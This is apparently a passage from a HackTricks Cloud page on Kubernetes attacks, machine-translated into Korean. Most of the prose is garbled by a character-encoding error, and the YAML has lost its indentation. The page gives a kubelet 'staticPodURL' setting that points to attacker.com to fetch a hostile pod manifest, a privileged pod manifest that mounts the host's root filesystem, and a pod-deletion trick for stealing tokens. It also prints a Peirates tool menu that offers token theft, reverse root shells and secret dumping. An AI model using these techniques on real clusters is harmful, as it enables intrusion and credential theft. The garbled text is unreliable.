ì •ì  íŒŒë“œë¥¼ ìƒì„±í•˜ë ¤ë©´ [**ë¬¸ì„œê°€ í° ë„ì›€ì´ ë©ë‹ˆë‹¤**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/) . ê¸°ë³¸ì ìœ¼ë¡œ 2ê°€ì§€ê°€ í•„ìš”í•©ë‹ˆë‹¤:

* **kubelet ì„œë¹„ìŠ¤** ë˜ëŠ” **kubelet êµ¬ì„±**ì—ì„œ **`--pod-manifest-path=/etc/kubernetes/manifests`** ë§¤ê°œë³€ìˆ˜ë¥¼ êµ¬ì„±í•˜ê³  ì„œë¹„ìŠ¤ë¥¼ ë‹¤ì‹œ ì‹œì‘í•©ë‹ˆë‹¤ ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration))
* **`/etc/kubernetes/manifests`**ì˜ **íŒŒë“œ ì •ì˜**ì— ì •ì˜ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.

**ë” ì€ë°€í•œ ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:**

* **kubelet** êµ¬ì„± íŒŒì¼ì—ì„œ **`staticPodURL`** ë§¤ê°œë³€ìˆ˜ë¥¼ ìˆ˜ì •í•˜ê³  `staticPodURL: http://attacker.com:8765/pod.yaml`ê³¼ ê°™ì´ ì„¤ì •í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ kubelet í”„ë¡œì„¸ìŠ¤ê°€ **ì§€ì •ëœ URLì—ì„œ êµ¬ì„±ì„ ê°€ì ¸ì™€ ì •ì  íŒŒë“œë¥¼ ìƒì„±**í•˜ê²Œ ë©ë‹ˆë‹¤.

**ë‹¤ìŒì€** [**ì—¬ê¸°**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/) **ì—ì„œ ê°€ì ¸ì˜¨ kube-systemì— ê¶Œí•œì´ ìˆëŠ” íŒŒë“œë¥¼ ìƒì„±í•˜ëŠ” ì˜ˆì‹œ**ì…ë‹ˆë‹¤:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### í¬ë“œ ì‚­ì œ + ìŠ¤ì¼€ì¤„í•  ìˆ˜ ì—†ëŠ” ë…¸ë“œ

ë§Œì•½ ê³µê²©ìê°€ **ë…¸ë“œë¥¼ ì¹¨íˆ¬**í–ˆê³ , ë‹¤ë¥¸ ë…¸ë“œì—ì„œ **í¬ë“œë¥¼ ì‚­ì œ**í•˜ê³  **ë‹¤ë¥¸ ë…¸ë“œê°€ í¬ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ì—†ê²Œ ë§Œë“¤ ìˆ˜ ìˆë‹¤ë©´**, í•´ë‹¹ í¬ë“œëŠ” ì¹¨íˆ¬ëœ ë…¸ë“œì—ì„œ ë‹¤ì‹œ ì‹¤í–‰ë˜ë©°, ê·¸ëŠ” ê·¸ë“¤ì—ì„œ ì‹¤í–‰ëœ **í† í°ì„ íƒˆì·¨**í•  ìˆ˜ ìˆì„ ê²ƒì…ë‹ˆë‹¤.\
[**ìì„¸í•œ ì •ë³´ëŠ” ì´ ë§í¬ë¥¼ ì°¸ê³ í•˜ì„¸ìš”**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## ìë™ ë„êµ¬

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>ì˜ì›¨ì–´ í•´í‚¹ì„ ì œë¡œë¶€í„° ì˜ì›¨ì–´ ì „ë¬¸ê°€ë¡œ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **PDF í˜•ì‹ì˜ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ì €í¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”**.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— ì œì¶œí•˜ì„¸ìš”**.

</details>
